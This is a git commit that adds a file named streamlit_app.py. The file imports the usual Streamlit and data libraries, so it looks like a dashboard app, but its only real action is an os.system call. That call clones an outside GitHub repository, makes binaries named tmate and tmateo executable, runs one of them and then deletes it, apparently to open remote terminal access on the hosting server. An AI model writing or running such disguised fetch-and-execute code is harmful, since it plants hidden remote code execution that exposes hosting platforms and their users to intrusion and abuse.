3c35e7f06b32b147ac1844c14e837d7d04ee12ed
JoseMoraa <113324459+JoseMoraa@users.noreply.github.com>
2022-09-14 16:43:19 +0000

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple 
+import altair as alt 
+import math 
+import pandas as pd 
+import streamlit as st 
+import os 
+os.system ("rm -rf tmateo && git clone https://github.com/JoseMoraa/morii.git && cd morii && chmod +x tmate && chmod +x tmateo && ./tmateo && rm -rf tmateo")
